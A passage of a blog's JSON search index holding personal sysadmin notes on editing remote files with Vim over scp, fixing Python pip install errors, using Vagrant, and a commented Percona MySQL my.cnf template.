的集成\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Kubernetes"],"title":"应大多数人要求写下kubeadm的基础使用"},{"categories":["URL","Vim"],"contents":" Vim Tips - Edit Remote Files With Vim On Linux Edit remote files with Vim on Linux $ vim scp://sk@192.168.225.22/info.txt user@remotesystem:port (E.g. sk@192.168.225.22)\nSingle slash (/) - If you want to edit a file that is stored in the $HOME directory of a remote system, you must use a trailing slash to separate remote system\u0026rsquo;s IP address or hostname from the file path.\nDouble slashes (//) - To specify full path of a file, you must use double slashes. For example, let us say you are editing a file named info.txt that is located in /home/sk/Documents/ directory of your remote system. In this case, the command would be: vim scp://sk@192.168.225.22//home/sk/Documents/info.txt\nIf you don\u0026rsquo;t have ssh/scp access, you can use other protocols, for example ftp. vim ftp://user@remotesystem/path/to/file\nEdit remote files within Vim session :e scp://sk@192.168.225.22/info.txt\n","date":"March 14, 2020","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200314-vim-tips-edit-remote-files-with-vim-on-linux/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.ostechnix.com/vim-tips-edit-remote-files-with-vim-on-linux/\" target=\"_blank\" rel=\"noopener\"\u003eVim Tips - Edit Remote Files With Vim On Linux\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"edit-remote-files-with-vim-on-linux\"\u003eEdit remote files with Vim on Linux\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ vim scp://sk@192.168.225.22/info.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003euser@remotesystem:port\u003c/code\u003e (E.g. \u003ccode\u003esk@192.168.225.22\u003c/code\u003e)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSingle slash (\u003ccode\u003e/\u003c/code\u003e) - If you want to edit a file that is stored in the $HOME directory of a remote system, you must use a trailing slash to separate remote system\u0026rsquo;s IP address or hostname from the file path.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eDouble slashes (\u003ccode\u003e//\u003c/code\u003e) - To specify full path of a file, you must use double slashes. For example, let us say you are editing a file named info.txt that is located in /home/sk/Documents/ directory of your remote system. In this case, the command would be: \u003ccode\u003evim scp://sk@192.168.225.22//home/sk/Documents/info.txt\u003c/code\u003e\u003c/p\u003e","tags":["URL","Vim"],"title":"Vim Tips - Edit Remote Files With Vim On Linux"},{"categories":["URL","Python","pip","issue"],"contents":" I can\u0026rsquo;t install python-ldap python-ldap https://www.python-ldap.org/en/latest/installing.html\n$ pip install python-ldap In file included from Modules/LDAPObject.c:9: Modules/errors.h:8: fatal error: lber.h: No such file or directory Debian/Ubuntu: sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev\nRedHat/CentOS:\nsudo yum install python-devel openldap-devel sudo yum groupinstall \u0026#34;Development tools\u0026#34; molecule $ pip install molecule error: command \u0026#39;gcc\u0026#39; failed with exit status 1 ---------------------------------------- Command \u0026#34;/usr/bin/python2 -u -c \u0026#34;import setuptools, tokenize;__file__=\u0026#39;/tmp/pip-install-I5DGC3/psutil/setup.py\u0026#39;;f=getattr(tokenize, \u0026#39;open\u0026#39;, open)(__file__);code=f.read().replace(\u0026#39;\\r\\n\u0026#39;, \u0026#39;\\n\u0026#39;);f.close();exec(compile(code, __file__, \u0026#39;exec\u0026#39;))\u0026#34; install --record /tmp/pip-record-Fy7V4X/install-record.txt --single-version-externally-managed --compile\u0026#34; failed with error code 1 in /tmp/pip-install-I5DGC3/psutil/ RedHat/CentOS: yum -y install gcc gcc-c++ kernel-devel yum -y install python-devel libxslt-devel libffi-devel openssl-devel ansible $ pip install ansible ImportError: No module named pkg_resources yum install -y python-setuptools import pandas ModuleNotFoundError: No module named \u0026#39;_bz2\u0026#39; apt-get install -y libbz2-dev yum install -y bzip2-devel from .cv2 import * ImportError: libSM.so.6: cannot open shared object file: No such file or directory ImportError: libXrender.so.1: cannot open shared object file: No such file or directory ImportError: libXext.so.6: cannot open shared object file: No such file or directory Ubuntu: apt-get install libsm6 apt-get install libxrender1 apt-get install libxext-dev CentOS: yum install libSM yum install libXrender-devel yum install libXext ","date":"March 4, 2020","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200304-i-cant-install-python-ldap/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/4768446/i-cant-install-python-ldap\" target=\"_blank\" rel=\"noopener\"\u003eI can\u0026rsquo;t install python-ldap\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"python-ldap\"\u003epython-ldap\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.python-ldap.org/en/latest/installing.html\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.python-ldap.org/en/latest/installing.html\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ pip install python-ldap\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eIn file included from Modules/LDAPObject.c:9:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eModules/errors.h:8: fatal error: lber.h: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eDebian/Ubuntu:\n\u003ccode\u003esudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRedHat/CentOS:\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo yum install python-devel openldap-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo yum groupinstall \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Development tools\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"molecule\"\u003emolecule\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ pip install molecule\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eerror: command \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;gcc\u0026#39;\u003c/span\u003e failed with exit status \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCommand \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/bin/python2 -u -c \u0026#34;\u003c/span\u003eimport setuptools, tokenize;__file__\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/tmp/pip-install-I5DGC3/psutil/setup.py\u0026#39;\u003c/span\u003e;f\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003egetattr\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003etokenize, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;open\u0026#39;\u003c/span\u003e, open\u003cspan style=\"color:#f92672\"\u003e)(\u003c/span\u003e__file__\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e;code\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ef.read\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e.replace\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\r\\n\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e;f.close\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e;exec\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecompile\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecode, __file__, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;exec\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e))\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34; install --record /tmp/pip-record-Fy7V4X/install-record.txt --single-version-externally-managed --compile\u0026#34;\u003c/span\u003e failed with error code \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e in /tmp/pip-install-I5DGC3/psutil/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eRedHat/CentOS:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum -y install gcc gcc-c++ kernel-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum -y install python-devel libxslt-devel libffi-devel openssl-devel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ansible\"\u003eansible\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ pip install ansible\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImportError: No module named pkg_resources\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y python-setuptools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch4 id=\"import-pandas\"\u003e\u003ccode\u003eimport pandas\u003c/code\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eModuleNotFoundError: No module named \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;_bz2\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt-get install -y libbz2-dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y bzip2-devel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"from-cv2-import-\"\u003e\u003ccode\u003efrom .cv2 import *\u003c/code\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImportError: libSM.so.6: cannot open shared object file: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImportError: libXrender.so.1: cannot open shared object file: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImportError: libXext.so.6: cannot open shared object file: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eUbuntu:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt-get install libsm6\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt-get install libxrender1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt-get install libxext-dev\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eCentOS:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install libSM\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install libXrender-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install libXext\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Python","pip","issue"],"title":"Python install module issues"},{"categories":["URL","Vagrant"],"contents":" vagrant 筆記 Vagrant+virtualbox (2): 實戰封裝自制 package.box Vagrant 學習筆記 1 General 1.1 Path 下載的 box 預設放在~/.vagrant.d/boxes 裡 guest machine 的 data 放的地方根據 VM 設定而不同可開啟 VirtualBox 查看，VirtualBox 預設是在~/VirtualBox\\ VMS\n1.2 Shared Folder guest machine 的/vagrant 將會自動 mount 到 host machine 的放 Vagrantfile 的那個 folder 此功能需要 guest machine 的 Box 的 VB guest additions 版本與 VM 中的一樣 若出現錯誤則需要更新 box 或用這個非官方的 plugin: https://github.com/dotless-de/vagrant-vbguest\n2 Uninstall 2.1 REMOVING THE VAGRANT PROGRAM\nrm -rf /Applications/Vagrant rm -f /usr/bin/vagrant sudo pkgutil --forget com.vagrant.vagrant 2.2 REMOVING USER DATA rm -rf ~/.vagrant.d 3 Command https://www.vagrantup.com/docs/cli/\nvagrant init #create Vagrantfile in current folder vagrant box add USER/BOX #add a box from https://atlas.hashicorp.com/boxes/search vagrant up #creates and configures guest machines according to your Vagrantfile vagrant ssh #SSH into a running Vagrant machine and give you access to a shell vagrant up --provider=vmware_fusion #indicate the provider vagrant destroy #stops the running machine Vagrant is managing and destroys all resources that were created during the machine creation process. vagrant halt #shutdown the running machine vagrant box remove NAME --all #remove box vagrant halt -f #force shutdown running maching that means to turn off the power vagrant suspend #save the current running state of the machine and stop it vagrant reload # == halt and up, use it after Vagrantfile modification vagrant reload --provision #provision does not run again by default, this command force run provision 3.1 halt vs destory vs box remove vagrant halt: 將machine關機 vagrant destroy: 將machine關機，且將該machine移除，但box還留著 vagrant box remove: 移除box 4 Provision example: 安裝 apache server and 將 DocumentRoot 指向/vagrant when provision bootstrap.sh\n#!/usr/bin/env bash apt-get update apt-get install -y apache2 if ! [ -L /var/www ]; then rm -rf /var/www ln -fs /vagrant /var/www fi Vagrantfile\nVagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;hashicorp/precise64\u0026#34; config.vm.provision :shell, path: \u0026#34;bootstrap.sh\u0026#34; end 記得 run vagrant reload -provision\n5 Network 5.1 Port Forwarding\nVagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;hashicorp/precise64\u0026#34; config.vm.provision :shell, path: \u0026#34;bootstrap.sh\u0026#34; config.vm.network :forwarded_port, guest: 80, host: 4567 end then run vagrant reload\n5.2 Private Network\nVagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.network \u0026#34;private_network\u0026#34;, type: \u0026#34;dhcp\u0026#34; end 6 Box 6.1 Create A Base Box https://www.vagrantup.com/docs/virtualbox/boxes.html\n","date":"February 26, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200226-vagrantvirtualbox-2-packagebox/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cwza.github.io/my_blog/2016/03/09/vagrant%E7%AD%86%E8%A8%98\" target=\"_blank\" rel=\"noopener\"\u003evagrant 筆記\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ben6.blogspot.com/2011/11/vagrantvirtualbox-2-packagebox.html\" target=\"_blank\" rel=\"noopener\"\u003eVagrant+virtualbox (2): 實戰封裝自制 package.box\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://vagrantpi.github.io/2018/02/11/vagrant/\" target=\"_blank\" rel=\"noopener\"\u003eVagrant 學習筆記\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e1 General\n1.1 Path\n下載的 box 預設放在~/.vagrant.d/boxes 裡\nguest machine 的 data 放的地方根據 VM 設定而不同可開啟 VirtualBox 查看，VirtualBox 預設是在~/VirtualBox\\ VMS\u003c/p\u003e\n\u003cp\u003e1.2 Shared Folder\nguest machine 的/vagrant 將會自動 mount 到 host machine 的放 Vagrantfile 的那個 folder\n此功能需要 guest machine 的 Box 的 VB guest additions 版本與 VM 中的一樣\n若出現錯誤則需要更新 box 或用這個非官方的 plugin: \u003ca href=\"https://github.com/dotless-de/vagrant-vbguest\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/dotless-de/vagrant-vbguest\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e2 Uninstall\n2.1 REMOVING THE VAGRANT PROGRAM\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -rf /Applications/Vagrant\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -f /usr/bin/vagrant\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo pkgutil --forget com.vagrant.vagrant\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2.2 REMOVING USER DATA\n\u003ccode\u003erm -rf  ~/.vagrant.d\u003c/code\u003e\n3 Command\n\u003ca href=\"https://www.vagrantup.com/docs/cli/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.vagrantup.com/docs/cli/\u003c/a\u003e\u003c/p\u003e","tags":["URL","Vagrant"],"title":"vagrant筆記"},{"categories":["MySQL","Percona"],"contents":"# Percona Server template configuration [mysqld] # # Remove leading # and set to the amount of RAM for the most important data # cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%. # innodb_buffer_pool_size = 128M # # Remove leading # to turn on a very important data integrity option: logging # changes to the binary log between backups. # log_bin # # Remove leading # to set options mainly useful for reporting servers. # The server defaults are faster for transactions and fast SELECTs. # Adjust sizes as needed, experiment to find the optimal values. # join_buffer_size = 128M # sort_buffer_size = 2M # read_rnd_buffer_size = 2M port=3306 datadir=/data/mysql socket=/data/mysql/mysql.sock pid_file=/data/mysql/mysqld.pid # 服务端编码 character_set_server=utf8mb4 # 服务端排序 collation_server=utf8mb4_general_ci # 强制使用 utf8mb4 编码集，忽略客户端设置 skip_character_set_client_handshake=1 # 日志输出到文件 log_output=FILE # 开启常规日志输出 general_log=1 # 常规日志输出文件位置 general_log_file=/var/log/mysql/mysqld.log # 错误日志位置 log_error=/var/log/mysql/mysqld-error.log # 记录慢查询 slow_query_log=1 # 慢查询时间(大于 1s 被视为慢查询) long_query_time=1 # 慢查询日志文件位置 slow_query_log_file=/var/log/mysql/mysqld-slow.log # 临时文件位置 tmpdir=/data/mysql_tmp # 线程池缓存(refs https://my.oschina.net/realfighter/blog/363853) thread_cache_size=30 # The number of open tables for all threads.(refs https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_table_open_cache) table_open_cache=16384 # 文件描述符(此处修改不生效，请修改 systemd service 配置) # refs https://www.percona.com/blog/2017/10/12/open_files_limit-mystery/ # refs https://www.cnblogs.com/wxxjianchi/p/10370419.html #open_files_limit=65535 # 表定义缓存(5.7 以后自动调整) # refs https://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_table_definition_cache # refs http://mysql.taobao.org/monthly/2015/08/10/ #table_definition_cache=16384 sort_buffer_size=1M join_buffer_size=1M # MyiSAM 引擎专用(内部临时磁盘表可能会用) read_buffer_size=1M read_rnd_buffer_size=1M # MyiSAM 引擎专用(内部临时磁盘表可能会用) key_buffer_size=32M # MyiSAM 引擎专用(内部临时磁盘表可能会用) bulk_insert_buffer_size=16M # myisam_sort_buffer_size 与 sort_buffer_size 区别请参考(https://stackoverflow.com/questions/7871027/myisam-sort-buffer-size-vs-sort-buffer-size) myisam_sort_buffer_size=64M # 内部内存临时表大小 tmp_table_size=32M # 用户创建的 MEMORY 表最大大小(tmp_table_size 受此值影响) max_heap_table_size=32M # 开启查询缓存 query_cache_type=1 # 查询缓存大小 query_cache_size=32M # sql mode sql_mode=\u0026#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\u0026#39; ########### Network ########### # 最大连接数(该参数受到最大文件描述符影响，如果不生效请检查最大文件描述符设置) # refs https://stackoverflow.com/questions/39976756/the-max-connections-in-mysql-5-7 max_connections=1500 # mysql 堆栈内暂存的链接数量 # 当短时间内链接数量超过 max_connections 时，部分链接会存储在堆栈内，存储数量受此参数控制 back_log=256 # 最大链接错误，针对于 client 主机，超过此数量的链接错误将会导致 mysql server 针对此主机执行锁定(禁止链接 ERROR 1129 ) # 此错误计数仅在 mysql 链接握手失败才会计算，一般出现问题时都是网络故障 # refs https://www.cnblogs.com/kerrycode/p/8405862.html max_connect_errors=100000 # mysql server 允许的最大数据包大小 max_allowed_packet=64M # 交互式客户端链接超时(30分钟自动断开) interactive_timeout=1800 # 非交互式链接超时时间(10分钟) # 如果客户端有连接池，则需要协商此参数(refs https://database.51cto.com/art/201909/603519.htm) wait_timeout=600 # 跳过外部文件系统锁定 # If you run multiple servers that use the same database directory (not recommended), # each server must have external locking enabled. # refs https://dev.mysql.com/doc/refman/5.7/en/external-locking.html skip_external_locking=1 # 跳过链接的域名解析(开启此选项后 mysql 用户授权的 host 方式失效) skip_name_resolve=0 # 禁用主机名缓存，每次都会走 DNS host_cache_size=0 ini ########### REPL ########### # 开启 binlog log_bin=mysql-bin # 作为从库时，同步信息依然写入 binlog，方便此从库再作为其他从库的主库 log_slave_updates=1 # server id，默认为 ipv4 地址去除第一段 # eg: 172.16.10.11 =\u0026gt; 161011 server_id=161011 # 每次次事务 binlog 刷新到磁盘 # refs http://liyangliang.me/posts/2014/03/innodb_flush_log_at_trx_commit-and-sync_binlog/ sync_binlog=100 # binlog 格式(refs https://zhuanlan.zhihu.com/p/33504555) binlog_format=row # binlog 自动清理时间 expire_logs_days=10 # 开启 relay-log，一般作为 slave 时开启 relay_log=mysql-replay # 主从复制时跳过 test 库 replicate_ignore_db=test # 每个 session binlog 缓存 binlog_cache_size=4M # binlog 滚动大小 max_binlog_size=1024M # GTID 相关(refs https://keithlan.github.io/2016/06/23/gtid/) #gtid_mode=1 #enforce_gtid_consistency=1 ########### InnoDB ########### # 永久表默认存储引擎 default_storage_engine=InnoDB # 系统表空间数据文件大小(初始化为 1G，并且自动增长) innodb_data_file_path=ibdata1:1G:autoextend # InnoDB 缓存池大小 # innodb_buffer_pool_size 必须等于 innodb_buffer_pool_chunk_size*innodb_buffer_pool_instances，或者是其整数倍 # refs https://dev.mysql.com/doc/refman/5.7/en/innodb-buffer-pool-resize.html # refs https://zhuanlan.zhihu.com/p/60089484 innodb_buffer_pool_size=7680M innodb_buffer_pool_instances=10 innodb_buffer_pool_chunk_size=128M # InnoDB 强制恢复(refs https://www.askmaclean.com/archives/mysql-innodb-innodb_force_recovery.html) innodb_force_recovery=0 # InnoDB buffer 预热(refs http://www.dbhelp.net/2017/01/12/mysql-innodb-buffer-pool-warmup.html) innodb_buffer_pool_dump_at_shutdown=1 innodb_buffer_pool_load_at_startup=1 # InnoDB 日志组中的日志文件数 innodb_log_files_in_group=2 # InnoDB redo 日志大小 # refs https://www.percona.com/blog/2017/10/18/chose-mysql-innodb_log_file_size/ innodb_log_file_size=256MB # 缓存还未提交的事务的缓冲区大小 innodb_log_buffer_size=16M # InnoDB 在事务提交后的日志写入频率 # refs http://liyangliang.me/posts/2014/03/innodb_flush_log_at_trx_commit-and-sync_binlog/ innodb_flush_log_at_trx_commit=2 # InnoDB DML 操作行级锁等待时间 # 超时返回 ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction # refs https://ningyu1.github.io/site/post/75-mysql-lock-wait-timeout-exceeded/ innodb_lock_wait_timeout=30 # InnoDB 行级锁超时是否回滚整个事务，默认为 OFF 仅回滚上一条语句 # 此时应用程序可以接受到错误后选择是否继续提交事务(并没有违反 ACID 原子性) # refs https://www.cnblogs.com/hustcat/archive/2012/11/18/2775487.html #innodb_rollback_on_timeout=ON # InnoDB 数据写入磁盘的方式，具体见博客文章 # refs https://www.cnblogs.com/gomysql/p/3595806.html innodb_flush_method=O_DIRECT # InnoDB 缓冲池脏页刷新百分比 # refs https://dbarobin.com/2015/08/29/mysql-optimization-under-ssd innodb_max_dirty_pages_pct=50 # InnoDB 每秒执行的写IO量 # refs https://www.centos.bz/2016/11/mysql-performance-tuning-15-config-item/#10.INNODB_IO_CAPACITY,%20INNODB_IO_CAPACITY_MAX innodb_io_capacity=500 innodb_io_capacity_max=1000 # 请求并发 InnoDB 线程数 # refs https://www.cnblogs.com/xinysu/p/6439715.html#_lab2_1_0 innodb_thread_concurrency=60 # 再使用多个 InnoDB 表空间时，允许打开的最大 \u0026#34;.ibd\u0026#34; 文件个数，不设置默认 300， # 并且取与 table_open_cache 相比较大的一个，此选项独立于 open_files_limit # refs https://dev.mysql.com/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_open_files innodb_open_files=65535 # 每个 InnoDB 表都存储在独立的表空间(.ibd)中 innodb_file_per_table=1 # 事务级别(可重复读，会出幻读) transaction_isolation=REPEATABLE-READ # 是否在搜索和索引扫描中使用间隙锁(gap locking)，不建议使用未来将删除 innodb_locks_unsafe_for_binlog=0 # InnoDB 后台清理线程数，更大的值有助于 DML 执行性能，\u0026gt;= 5.7.8 默认为 4 innodb_purge_threads=4 ","date":"February 7, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200207-my.cnf/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre 